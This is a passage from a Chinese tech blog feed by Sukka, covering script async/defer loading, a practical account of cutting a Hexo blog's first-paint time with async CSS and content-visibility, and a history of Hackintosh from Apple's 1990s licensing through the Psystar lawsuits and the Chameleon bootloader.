中、并显式声明 <code>async = true</code> 无疑是唯一的方法。随着古董浏览器逐渐退出人们的视线、实现 <code>async</code> 属性的浏览器在全球的份额已经达到了 98.08%，Google 终于开始直接用 <code>&lt;script async&gt;</code> 标签引入 Google Tag Manager。</p>\n<div class=\"license\"> <div class=\"license-title\">从 Google Analytics 的统计代码说起 —— 谈谈 script 标签的 async 和 defer 属性</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/script-async-defer/\">https://blog.skk.moe/post/script-async-defer/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-10-13</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/script-async-defer/"},{"title":"再快一点，再快一点 —— 优化博客白屏时间的实践","date":"2020-10-03 08:40:00","description":"\n<p>两个多月以前，我写了一篇文章 <a href=\"https://blog.skk.moe/post/how-to-make-a-fast-blog/\">介绍我是如何优化我的博客的</a>，但是我对于博客的白屏时间仍然不满意。过去一个月我在博客上进行了一系列优化实践，终于成功将博客的白屏时间减少了将近 50%，这篇文章就来记录优化的过程和方案。</p>\n<h2>确定和分析白屏时间</h2>\n<p>First Paint 和 First Contentful Paint 是衡量白屏时间的重要指标。Google Chrome 团队提供了专门的库 <code>web-vitals</code> 用于在浏览器中衡量这些指标。直接在本地开发环境中引入该库：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">script</span> <span class=\"hljs-attr\">type</span>=<span class=\"hljs-string\">\"module\"</span>&gt;</span><span class=\"javascript\"></span><span class=\"javascript\">  <span class=\"hljs-keyword\">import</span> {getFCP, getLCP, getFID} <span class=\"hljs-keyword\">from</span> <span class=\"hljs-string\">'https://unpkg.com/web-vitals@0.2.4/dist/web-vitals.es5.min.js?module'</span>;</span><span class=\"javascript\">  <span class=\"hljs-comment\">// 获取 First Contentful Paint</span></span><span class=\"javascript\">  getFCP(<span class=\"hljs-function\">(<span class=\"hljs-params\">{ name, value }</span>) =&gt;</span> <span class=\"hljs-built_in\">console</span>.log(name, value));</span><span class=\"javascript\">  <span class=\"hljs-comment\">// 获取 Largest Contentful Paint</span></span><span class=\"javascript\">  getLCP(<span class=\"hljs-function\">(<span class=\"hljs-params\">{ name, value }</span>) =&gt;</span> <span class=\"hljs-built_in\">console</span>.log(name, value));</span><span class=\"javascript\">  <span class=\"hljs-comment\">// 获取 First Input Delay</span></span><span class=\"javascript\">  getFID(<span class=\"hljs-function\">(<span class=\"hljs-params\">{ name, value }</span>) =&gt;</span> <span class=\"hljs-built_in\">console</span>.log(name, value));</span><span class=\"javascript\"></span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">script</span>&gt;</span></code></pre>\n<p>访问在本地运行的 Hexo Server 实例（<code>http://localhost:4000</code>），打开任意一篇文章，然后在 Dev Tools 中切换到「Performance」Tab 中限制 Network 和 CPU 性能：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/1.png\" width=\"1276\" height=\"279\" class=\"lazy post-img\"></p>\n<blockquote><p>进行性能测试时，模拟移动端的网络和性能是非常重要的。然而，Firefox 的 Dev Tools 至今很遗憾地没有实现这个功能（许多类似的 Feature Request 在 Bugzilla 已经 stall 数个月了）。这也是为什么我钟情于使用 Chromium Based 的浏览器开发的原因。</p></blockquote>\n<p>刷新页面，Console 中会输出三个数值（单位均为毫秒）：</p>\n<pre><code class=\"hljs plaintext\">FCP 1537.4400000000605LCP 1921.934FID 3.559999997378327</code></pre>\n<p>可以看到，First Contentful Paint 时间在 1.5 秒左右、而 Largest Contentful Paint（最大的可视元素，此时是文章的头图）是 1.9 秒。考虑到这是在本地环境、TTFB 只受模拟的「Fast 3G」限制，不难想象在实际访客体验中白屏时间绝对不止 1.5 秒。</p>\n<h2>分析性能瓶颈</h2>\n<p>肯定了问题的确存在，接下来就需要寻找性能瓶颈了。在「Performance」Tab 中将 CPU 性能修改为「6x slowdown」放大性能瓶颈，然后用「Start profiling and reload page」按钮刷新页面和获取火焰图：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/2.png\" width=\"1386\" height=\"946\" class=\"lazy post-img\"></p>\n<p>其中，Layout 占据的时间（117.43ms）比 Parse HTML（22.48ms）和 Recalculate Style（20.37ms）都要长得多，基本可以认定这就是性能瓶颈了。接下来判断是页面什么元素导致了 Layout 的性能瓶颈。对博客中其它页面进行 Profiling，并将火焰图进行对比：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/3.png\" width=\"860\" height=\"450\" class=\"lazy post-img\"></p>\n<blockquote><p>从左往右分别是 「<a href=\"https://blog.skk.moe/post/make-oh-my-zsh-fly/\">我就感觉到快 —— zsh 和 oh my zsh 冷启动速度优化</a>」、首页、「<a href=\"https://blog.skk.moe/post/hello-world/\">Hello World</a>」页面的火焰图和 Layout 用时。</p></blockquote>\n<p>根据火焰图和三个页面的特征，猜测是文章内容部分导致了 Layout 用时过长。为了加以验证，在 CSS 中使用 <code>display: none</code> 将文章内容直接从 DOM 中离线，然后重新生成火焰图。</p>\n<blockquote><p>在页面渲染时， <code>display: none</code>  的元素会直接从 DOM 中离线、不参加 Style 和 Layout。</p></blockquote>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/4.png\" width=\"1194\" height=\"946\" class=\"lazy post-img\"></p>\n<p>将文章内容设置 <code>display: none</code> 后，Layout 性能直接提升了三倍，所以可以确认性能瓶颈就是文章内容的 Layout 了。</p>\n<h2>优化白屏时间</h2>\n<p>文章内容的 Layout 时间比较长，而文章内容在加载完之前不会触发 First Paint。所以如果需要缩短白屏时间，就必须缩短文章内容 Layout 的用时。</p>\n<p>Layout 是浏览器计算元素几何信息的过程：元素的大小、在页面中的位置。Layout 性能一般和 DOM 元素数量、布局复杂性、布局模型有关。对于 DOM 元素数量这一点没有什么好的解决方案 —— 文章就这么长、每个段落就是一个 <code>&lt;p&gt;</code> 元素；对于文章内容也没有布局复杂性或布局模型可言。因此这是一条死路。</p>\n<p>直接对着自己的博客动死脑筋是行不通的，我决定先和其他的内容网站的 Layout 性能对比一下：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/5.png\" width=\"960\" height=\"500\" class=\"lazy post-img\"></p>\n<blockquote><p>上图左一为知乎专栏文章「<a href=\"https://zhuanlan.zhihu.com/p/25800461\">PWA 在饿了么的实践经验</a>」的火焰图；左二为 QuQuBlog「<a href=\"https://imququ.com/post/optimize-tls-handshake.html\">TLS 握手优化详解</a>」的火焰图；左三为 dev.to 的「<a href=\"https://dev.to/mustapha/css-grid-illustrated-introduction-52l5\">CSS Grid: illustrated introduction</a>」的火焰图。</p></blockquote>\n<p>和其它内容网站比较发现，当页面包含较长篇幅的内容时，「CPU 6x slowdown」下 Layout 用时大抵在 100ms 到 200ms 左右。我的博客内容页面 Layout 用时在 120ms 属于正常范围、基本没有进一步优化的空间。</p>\n<p>不过，我在看 dev.to 的火焰图时发现了一个很有趣的现象：虽然完整 DOM 的 Layout 用时在 123.70ms、但是却发生在 First Paint 和 First Contentful Paint 之后。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/6.png\" width=\"1090\" height=\"314\" class=\"lazy post-img\"></p>\n<p>结合截图和火焰图可以发现，dev.to 在加载文章页面时，先只渲染 Navbar、触发 First Paint、结束白屏；之后继续 Parse HTML、渲染页面主体内容；最后是 Lazyload 后的文章头图、触发 Largest Contentful Paint。这种思路在 H5、小程序中都是很常见：使用 Placeholder （被称为 AppShell）缩短白屏时间、然后再通过 AJAX 获取数据填充到页面上。但是静态博客和小程序最大的区别就是不需要获取数据、文章内容是直接包含在 HTML 中返回的，所以在博客上实践这样的思路需要做一些改变。</p>\n<p>我的做法则是将 CSS 拆分，将 Navbar 和右下角 Fab 按钮的 CSS 提取出来、内联在 HTML 中、当页面加载时就可以 Style &amp; Layout。同时为页面主题内容添加 <code>display: none</code> 使其在 DOM 中离线，使其不影响 First Paint；页面主体内容的 CSS（包括  <code>display: block</code>） 拆分成独立的 CSS。由于 CSS 是「渲染阻塞（Render Blocking）」的资源，浏览器在 Parse HTML 时如果遇到 CSS 就会开始请求、并在 CSS 下载完成之前不会开始 Style &amp; Layout。因此，需要一个小 trick 实现异步加载 CSS（使 CSS 不再阻塞渲染）：</p>\n<pre><code class=\"hljs html\"><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">link</span> <span class=\"hljs-attr\">rel</span>=<span class=\"hljs-string\">\"stylesheet\"</span> <span class=\"hljs-attr\">href</span>=<span class=\"hljs-string\">\"defer.css\"</span> <span class=\"hljs-attr\">media</span>=<span class=\"hljs-string\">\"print\"</span> <span class=\"hljs-attr\">onload</span>=<span class=\"hljs-string\">\"this.media='all';this.onload=null\"</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">noscript</span>&gt;</span><span class=\"hljs-tag\">&lt;<span class=\"hljs-name\">link</span> <span class=\"hljs-attr\">rel</span>=<span class=\"hljs-string\">\"stylesheet\"</span> <span class=\"hljs-attr\">href</span>=<span class=\"hljs-string\">\"defer.css\"</span>&gt;</span><span class=\"hljs-tag\">&lt;/<span class=\"hljs-name\">noscript</span>&gt;</span></code></pre>\n<p>带有 <code>[media=print]</code> 属性的 CSS 仍然会以低优先级加载，但并不会直接参与 Style &amp; Layout、因此不会阻塞渲染。当 CSS 文件下载后触发 <code>onload</code> 事件、将 <code>media</code> 属性改为 <code>all</code>、使 CSS 在当前页面生效。</p>\n<p>为了使白屏不显得枯燥，我还加了一个「加载中」的闪烁动画，使用 <code>animation-delay</code> 延迟 0.6 秒显示。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/9.png\" width=\"813\" height=\"849\" class=\"lazy post-img\"></p>\n<p>不过使用这种方案需要注意两个问题。一是当页面内容被 <code>display: none</code> 后、页面的高度会小于 viewport、因此浏览器不会展示滚动条；当页面内容被覆盖为 <code>display: block</code> 后、浏览器会重新展示滚动条、导致抖动，因此需要为 <code>&lt;html&gt;</code> 添加 <code>overflow-y: scroll</code>。另一个问题是新的 CSS 生效时会触发新的 Style &amp; Layout、可能会导致已经渲染过的 Navbar 和 Fab 按钮被再次 Layout，造成性能浪费；解决方案是使用「<a href=\"https://drafts.csswg.org/css-contain/\">CSS Containment</a>」草案中引入的 <code>contain</code> 属性，通过在 CSS 中显式声明当前元素及其后代与 DOM 的关系，当浏览器重新计算样式和布局时只会影响有限的 DOM。截至本文写就，Edge（Chromium Based）、Firefox、Chrome 都已经对 <code>contain</code> 属性提供了支持。关于 CSS Containment 的用法，可以参考 <a href=\"https://developer.mozilla.org/en-US/docs/Web/CSS/contain\">MDN 上对 contain 的说明</a>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/7.png\" width=\"800\" height=\"368\" class=\"lazy post-img\"></p>\n<p>同时，如果使用异步加载 CSS，那么页面主体内容的显示时机就会受到两个因素制约 —— 除 Style &amp; Layout 外、还有 CSS 的加载。为了尽可能消除 CSS 加载对文章内容显示的影响，我为 CSS 设置了 HTTP/2 Push，这样 CSS 能够和 HTML 同时到达浏览器、但不会马上参与 First Paint 的 Style &amp; Layout。关于 HTTP/2 Push 的更多细节，可以参考我的文章「<a href=\"https://blog.skk.moe/post/http2-server-push/\">静态资源递送优化：HTTP/2 和 Server Push</a>」。</p>\n<p>实践的效果妙不可言：First Paint 之前的 Style &amp; Layout 用时加起来也不超过 50ms、几乎 HTML 一下载完就可以看到 Navbar。当 <code>defer.css</code> 加载完、样式和布局计算完后文章内容即绘制到屏幕上。如果 <code>defer.css</code> 出于某种原因没有及时加载（如 User-Agent 不支持 HTTP/2 Push、<code>defer.css</code> 未能命中缓存），那么「加载中…」就会展示出来，使访客不会认为页面失去响应。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/8.png\" width=\"1106\" height=\"945\" class=\"lazy post-img\"></p>\n<h2>尝试新属性</h2>\n<p>虽然减少了白屏时间，但是长篇幅的内容的布局计算仍然非常耗时；当文章越来越长时，用户仍然可能会对「加载中」失去耐心。不过 Chromium 85 开始对一些 CSS Containment 草案中的 CSS 属性（如 <code>content-visibility</code>）提供支持。当一个元素被声明  <code>content-visibility</code> 属性后，如果这个元素不在 viewport 中、浏览器就不会计算其后代元素样式和属性，从而大幅节省 Style &amp; Layout 耗时。目前，仅 Chrome/Chromium 85 提供对该属性的支持（没错，Firefox 把这个 Feature 也扔进「值得一试」里了）。更多关于 <code>content-visibility</code> 的介绍可以查看 <a href=\"https://web.dev/content-visibility/\">web.dev 上的相关文章</a>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.3.4/10.jpg\" width=\"1600\" height=\"1108\" class=\"lazy post-img\"></p>\n<p>使用 <code>content-visibility</code> 属性需要将页面内容分块。于是我写了一个 Hexo 插件，在文章内容渲染时将每两个 <code>&lt;h2&gt;</code> 之间的内容分为一块、用 <code>&lt;div class=\"story\"&gt;</code> 包裹起来。然后为 <code>.story</code> 声明 <code>content-visibility: auto</code>。</p>\n<p>需要注意的是，<code>content-visibility</code> 绕过的是不在当前 viewport 的元素的后代元素的样式和布局、只保留一个元素盒子。如果没有显式声明元素的高度的话那么这个元素的高度就是 0 了。虽然 Chrome/Chromium 在实现 <code>content-visibility</code> 时会试图避免 Curative Layout Shift（在元素即将进入 viewport 时就开始渲染），但是滚动条的高度会发生改变。所以「CSS Containment」草案中还提出了一个新属性 <code>contain-intrinsic-size</code>、用于声明一个「元素盒子」的高度。这个属性不影响渲染后元素的实际尺寸，实际使用时只需要预估高度即可：</p>\n<pre><code class=\"hljs css\"><span class=\"hljs-selector-class\">.story</span> {  <span class=\"hljs-attribute\">content</span>-<span class=\"hljs-attribute\">visibility</span>: auto;  contain-intrinsic-size: <span class=\"hljs-number\">1000px</span>; // 不靠谱地取个 <span class=\"hljs-number\">1000px</span>}</code></pre>\n<blockquote><p><code>content-visibility</code> 除了可以改善 Layout 性能外，值得一提的还有其另一个取值 <code>hidden</code>。众所周知 <code>display: none</code> 会使元素「离线」，元素会从 DOM 中消失、同时渲染状态也会随之消失；而 <code>visibility: hidden</code> 只是会隐藏元素、而元素本身依然保留在 DOM 中，渲染状态也保留。而 <code>content-visibility: hidden</code> 则介于两者之间，元素会从 DOM 中消失、但是保留渲染属性。</p></blockquote>\n<p>利用 <code>content-visibility</code> 和 <code>contain-intrinsic-size</code> 后，文章的 Layout 时间从 120ms 减少到了 70ms、减少了将近 40%，只能希望越来越多的浏览器能够提供对这两个属性的支持了。</p>\n<div class=\"license\"> <div class=\"license-title\">再快一点，再快一点 —— 优化博客白屏时间的实践</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/improve-fcp-for-my-blog/\">https://blog.skk.moe/post/improve-fcp-for-my-blog/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-10-03</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/improve-fcp-for-my-blog/"},{"title":"黑苹果的历史","date":"2020-09-02 21:45:00","description":"\n<h2>楔子：第一台「黑苹果」</h2>\n<p>如果按照「黑苹果」的定义 —— 在一台没有苹果 Logo 的电脑上运行苹果公司开发的操作系统 —— 那么全世界第一台「黑苹果」应该诞生于 24 年前。1996 年，苹果将 Macintosh 电脑切换到 IBM 的 PowerPC 架构。时任苹果 CEO Gil Amelio 借此机会，与一些使用和 Macintosh 同款 CPU 和主板的厂商（如摩托罗拉）签约，授权他们的 PC 预装苹果的 Macintosh System 7（即 Classic Mac OS 7）。</p>\n<p>然而，1997 年 7 月发生了两件事。一件事是乔布斯回到苹果、被正式任命为苹果公司的 CEO，另一件事是 7 月 26 日 Mac OS 8 正式发布。</p>\n<p>Mac OS 8 并没有带来革命性的更新 —— 这个版本原本应该被命名为 Mac OS 7.7 。但是苹果公司前 CEO 同第三方厂商签订的系统授权协议是基于 Macintosh System 7 的。乔布斯选择发布 Mac OS 8.0，巧妙地利用命名和版本号的不同，直接把后续的服务和协议一起中断掉了。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/1.png\" width=\"405\" height=\"599\" class=\"lazy post-img\"></p>\n<blockquote><p>摩托罗拉生产的 StarMax 兼容机，可以直接安装 System 7。</p></blockquote>\n<h2>从 PowerPC 到 x86</h2>\n<p>把 Macintosh System 7 的授权协议理解为黑苹果有些取巧了。要谈现代的黑苹果，那么一定不能无视苹果迈向 x86 的道路，所以让我们把时间再倒回去 5 年吧。</p>\n<p>1992 年 2 月 14 日，苹果开展了一项秘密计划「Star Trek」，将 Macintosh System 7（Classic Mac OS 7）连同其应用程序迁移到 Intel 架构兼容的 PC 机（采用 Intel 486 处理器）上，并要求在 12 月 1 日就拿出第一台原型机。苹果的工程师夜以继日的重构，终于赶在 Deadline 之前完成了 System 7 和 QuickTime 的移植。但是随着苹果时任 CEO John Sculley 离开公司，接任的 CEO Michael Spindler 更青睐 PowerPC 架构，Star Trek 随即被取消。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/2.png\" width=\"640\" height=\"480\" class=\"lazy post-img\"></p>\n<blockquote><p>Macintosh System 7 的界面截图</p></blockquote>\n<p>虽然 Star Trek 被取消，但是仍然有部分苹果工程师努力将 Mac OS 移植到 x86 平台，其中成果最显著的是工程师 John Kullman，他在 2001 年 12 月成功将 Mac OS X 移植到了 x86 的 Quora PC 上。被称为「Mac OS X 之父」的 Bertrand Serlet（他后来成为 10.4 Tiger、10.5 Leopard 和 10.6 Snow Leopard 主要负责人）得知此事后与 John Kullman 会面，希望他将 Mac OS X 移植到一台索尼 VAIO 笔记本上。John Kullman 在当天晚餐之前就完成了任务。第二天，乔布斯就带着这台 VAIO 飞往东京，与索尼时任社长安藤国威会面，商讨有关在索尼的 VAIO 上运行 Mac OS X 的事宜，但谈判无疾而终。</p>\n<p>即使「索粉」乔布斯未能和索尼达成合作，苹果内部仍然于 2002 年进行了一项新的秘密计划「Marklar」，目的是继续维持 Mac OS X 与 x86 的兼容性。直到 2005 年 6 月 6 日，苹果在旧金山莫斯康展览中心举办了 WWDC 2005，乔布斯正式宣布他们将把个人电脑产品线 <a href=\"https://www.apple.com/newsroom/2005/06/06Apple-to-Use-Intel-Microprocessors-Beginning-in-2006/\">从 PowerPC 架构转变为 Intel 架构</a>。2006 年 1 月 10 日，苹果发布了第一台使用 Intel Core（英特尔酷睿）的 MacBook Pro，代替先前的产品线 PowerBook。12 月 28 日，苹果发布了 Mac Mini，同样搭载了 Intel Core 处理器。2007 年 4 月 5 日，苹果推出 Boot Camp（启动转换），4 月 24 日，苹果推出 17 寸的 MacBook Pro，5 月 16 日，苹果推出 12 寸的 MacBook 以代替 iBook 产品线，7 月 5 日，苹果推出 iMac 以代替 eMac 产品线，8 月 7 日，苹果推出新的高端电脑产品线 Mac Pro。2009 年 8 月，苹果推出 Mac OS X 10.6 Snow Leopard，这是第一个只支持 x86 的 Mac OS X，宣告苹果正式放弃了对 PowerPC 的支持。</p>\n<h2>黑苹果的第一道曙光</h2>\n<p>回到 WWDC 2005，苹果向开发者推出了搭载 Intel 处理器的 DTK（Dev Transition Kit），搭载了兼容 Intel 的 Mac OS X 10.4.1。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/3.png\" width=\"640\" height=\"480\" class=\"lazy post-img\"></p>\n<blockquote><p>Mac OS X 10.4.1 Tiger 开发版运行在搭载了 Intel 处理器的 DTK 上。</p></blockquote>\n<p>很快，就有人尝试在非苹果硬件上运行开发版的 Mac OS X，但是该系统拒绝在普通的 PC 上运行：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/4.png\" width=\"724\" height=\"400\" class=\"lazy post-img\"></p>\n<blockquote><p>当试图在非 Mac 平台上安装开发版的 Mac OS X Tiger 10.4.1 时会看到上图的提示信息：Darwin/x86 不支持你的硬件配置。</p></blockquote>\n<p>当时，将 Mac OS X Tiger 10.4.1 运行在普通的 PC 上有三大障碍：第一是指令集，DTK 内置的 <a href=\"https://ark.intel.com/content/www/cn/zh/ark/products/27484/intel-pentium-4-processor-660-supporting-ht-technology-2m-cache-3-60-ghz-800-mhz-fsb.html\">Intel Pentium 4 660 CPU</a> 支持 SSE-3 指令集，但是 2004 年前后的 PC 常见的处理器都不包括该指令集；其次是芯片组，Mac OS X 开发版只支持 Intel 915G/ICH6 芯片组；最后，当时的苹果的 DTK 使用了 Infineon TPM 安全芯片。讽刺的是，最难克服的障碍其实不是硬件或安全芯片，而是指令集。</p>\n<p>目前可考的第一台成功的黑苹果诞生于 2005 年 8 月 10 日，那一天 <a href=\"https://web.archive.org/web/20051018182314/http://hardmac.com/news/2005-08-10/\">HardMac 网站收到匿名开发者发来的两段视频</a>，视频中展示了 Mac OS X 10.4.1 Tiger 运行在搭载 Pentium M 735 处理器的 Mitac 8050D 笔记本上。</p>\n<blockquote><p>值得一提的是，2006 年 1 月 10 日苹果发布 MacBook Pro，相比传统 x86 主板使用 BIOS 引导（Legacy），MacBook Pro 使用了 UEFI 引导方式。</p></blockquote>\n<p>2006 年 2 月 14 日，「The Guru」团队的成员 Maxxuss（crg92）发布了首个 Patch 补丁。通过该补丁修补 XNU 内核即可解除引导和安装限制、在任何内置 SSE-2 指令集的 Intel 处理器上运行 Mac OS X 10.4.4，今天 <a href=\"https://www.insanelymac.com/forum/topic/9071-1044-security-broken/?page=1\">在 InsanelyMac 上仍然可以找到当时的帖子</a>。几小时之后苹果发布了 10.4.5 版本的 Mac OS X，又过了两周 crg92 就放出了新的针对 10.4.5 的补丁。</p>\n<p>苹果随后的几个月内发布了 Mac OS X 10.4.6 和 10.4.7，OSx86 社区成员设法将这些系统中的新版本的内核替换为 10.4.4 和 10.4.5 的旧内核、实现将这些新版本的系统安装在 PC 上。但是从 10.4.8 开始，苹果开始更广泛地使用 SSE-3 指令集，意味仅仅通过修补 XNU 内核已经无法再兼容只支持 SSE-2 指令集的处理器（如早期的奔腾 4）。来自新西兰的 macOS、iOS 开发者与逆向工程师 <a href=\"http://mifki.com/\">Mfiki</a>（Vitaly Pronkin）于 2006 年 12 月 24 日放出了一个新的更精简的 Patch 以使 XNU 内核兼容 SSE2；而开发者 Semthex 则制作了一个通过 SSE-2 模拟 SSE-3 的指令集模拟器。 </p>\n<p>Mac OS X 10.5 Leopard 于 2007 年正式发布，随后 BrazilMac 发布了一个通用补丁。用户可以通过购买 Mac OS X 零售版的安装光盘、打上补丁即可让 XNU 内核运行在普通 Intel PC 上。之后，数个黑客和开发者（如 Lorem、SynthetiX、ToH、StageXNU 团队）都纷纷释出了内核补丁。同时，基于这些补丁制作的 Mac OS X「发行版」开始出现，如 iATKOS、<a href=\"https://www.insanelymac.com/forum/topic/77069-kalyway-1051-dvd-release-the-official/\">KALYWAY</a> 和 <a href=\"http://ipcosx86.wikidot.com/\">iPC</a>。</p>\n<blockquote><p>之后随着 EFI 引导方法的流行，这些发行版都逐渐改为在系统中内置 Boot-132 或 Chameleon。</p></blockquote>\n<h2>中场休息：对美国法院的一瞥</h2>\n<p>2008 年 4 月，一家名为 Psystar 的公司在美国佛罗里达州注册。这家公司计划公开销售 Intel PC，预装内置 BrazilMac 补丁的 Mac OS X 10.5 Leopard。这种 PC 一开始被称为「OpenMac」，很快又被更名为「Open Computers」。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/6.jpg\" width=\"450\" height=\"450\" class=\"lazy post-img\"></p>\n<blockquote><p>Pystar 的「OpenMac」</p></blockquote>\n<p>2008 年 7 月 3 日，苹果在加利福尼亚州地区法院起诉 Pystar 公司，声称 Pystar 公司侵犯了苹果的版权、违反了数字千年版权法案（DMCA），「避开、绕过、移除、解扰、解密、停用、破坏苹果保护机制」。</p>\n<p>2008 年 8 月 28 日，Pystar 公司在佛罗里达州地区法院起诉苹果，声称苹果公司存在垄断和其它不正当竞争行为。2008 年 11 月 18 日，Pystar 公司的起诉被驳回。</p>\n<p>2009 年 2 月 5 日，<a href=\"http://www.computerworld.com/s/article/9127579/Mac_clone_maker_wins_legal_round_against_Apple\">Pystar 公司赢得苹果第一轮的版权诉讼</a>。<strong>这一判例意味着苹果的 EULA 中的「禁止在一台没有苹果 Logo 的电脑上运行苹果公司开发的操作系统」条款可能是没有法律效力的</strong>。</p>\n<p>2009 年 4 月，苹果的新闻发言人表示 Pystar 公司没有依法公开任何财务信息（利润、资产、负债）。Pystar 的 CEO 兼创始人对此拒绝置评，并仍然拒绝透露任何财务信息。</p>\n<p>2009 年 5 月 26 日，Pystar 公司申请破产保护，试图通过破产保护法案拖延苹果的诉讼。在申请破产期间，Pystar 公司仍然在销售预装 Mac OS X 的 PC，因此 2009 年 6 月法院解除了苹果的诉讼中止，使苹果可以继续起诉 Pystar 公司。2009 年 8 月 12 日，Pystar 公司的破产保护申请被佛罗里达地区法院驳回。</p>\n<p>2009 年 11 月 13 日，加利福尼亚州地方法院判定 Pystar 违反了 DMCA 和侵犯了苹果的版权，定于 12 月 14 日举行听证会。2009 年 12 月 15 日，加利福尼亚州法院发表永久性禁令，禁止 Pystar 制造、分发、协助任何人安装任何版本（包括未来版本）的 Mac OS X。2010 年 1 月 16 日，Pystar 公司提起上诉。2012 年 5 月 14 日，最高法院驳回了 Pystar 公司的上诉，苹果赢得了最终的诉讼。</p>\n<h2>向 Chameleon（变色龙）进发</h2>\n<p>回到 WWDC 2005 上发布的搭载 Intel DTK，内置了一个名为 Boot-132 的 UEFI Bootloader 用于加载 XNU 内核。。当时 Intel 的 UEFI 还是新鲜产物、几乎所有的 PC 都在使用 BIOS 引导（也就是现在被称为 Legacy BIOS 的引导方法）。Boot-132 后来随 Mac OS X 10.4.8 的 XNU 内核一起开源，所以在 2007 年，David Elliott 基于 Linux 的 GRUB Bootloader 和苹果 Boot-132 的源码开发了一个初级的 Bootloader，能够为使用 Legacy BIOS 引导的 PC 提供一个「模拟 UEFI」环境用于加载 XNU 内核。</p>\n<blockquote><p>除了 Boot-dfe，David Elliott 的作品还包括初版的 <a href=\"http://tgwbd.org/darwin/extensions.html#NullCPUPowerManagement\">NullCPUPowerManagement</a>，用于兼容苹果的电源管理 AppleIntelCPUPowerManagement。</p></blockquote>\n<p>2008 年，Voodoo 团队（原 StageXNU 团队，你应该记得在上个章节中看到过这个名字）将 David Elliott 开发的「模拟 UEFI」实现与苹果原始的 Boot-132 结合，制作了 Chameleon（变色龙）项目。随着 Chameleon 的不断迭代更新，许多功能如注入 Device Properties（设备属性）、加载 Kernel Extension（内核扩展，即 kext）、修补 ACPI、模拟 SMBIOS 机型、图形化界面的启动菜单都一一被支持。Voodoo 团队还开发了数个 kext 如 VoodooPower、VoodooSDHCI 以及在 Hackintosher 中耳熟能详的 VoodooHDA 和 VoodooPS2Controller。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.2.2/5.png\" width=\"419\" height=\"330\" class=\"lazy post-img\"></p>\n<blockquote><p>在 QEMU 虚拟机中通过 Chameleon 2.1.0 引导 PureDarwin，该版本的变色龙已经支持图形化引导界面。</p></blockquote>\n<p>由于变色龙的出现，越来越少的人选择反编译修改 XNU 内核、而是通过 Bootloader 替换 DSDT、注入设备属性和 kext。<strong>考虑到数字千年版权法（DMCA）禁止修改并分发 macOS 中非开源部分的操作系统代码，使用 Bootloader 引导黑苹果无需直接修改操作系统或 XNU 内核本身、因而成功绕过了这一法律。</strong></p>\n<p>2009 年，Mac OS X 10.6 Snow Leopard 正式发布，这是第一个完全放弃 PowerPC 架构的 Mac OS X 版本。来自俄罗斯的 <a href=\"http://netkas.org/\">Netkas</a> 率先释出了一个修改版的变色龙 EFI 可以用于引导 Mac OS X 10.6。紧接着，Voodoo 团队也释出了兼容 10.6 的官方版本更新。</p>\n<blockquote><p>除了率先使变色龙兼容 Mac OS X 10.6，Netkas 还开发了 FakeSMC 和 HWSensor。现在 Netkas 致力于拓展 AMD 显卡的兼容性（如在 macOS 10.14 Mojave 为 Raedon RX560 启用 Metal 支持、避免 Raedon W5700 在 macOS 10.15.5 上引发 Kernel Panic 等）。</p></blockquote>\n<p>2011 年，Mac OS X 10.7 Lion 发布。这是苹果第一个不再提供安装光盘的 Mac OS X 版本，也是第一个支持 SSD TRIM 的 Mac OS X 版本。来自俄罗斯的 Michael Belyaev（usr-sse2）率先找到了安装方法，将修改版安装镜像写入到 USB 存储设备，并通过 XPC EFI Bootloader（一个基于 DUET 的模拟 EFI 引导器）启动 XNU 内核。</p>\n<blockquote><p>usr-sse2 现在是 acidanthera 团队的活跃成员，参与了 OpenCore 和 VirtualSMC 等的开发。截至本文写就，usr-sse2 正在研究苹果的 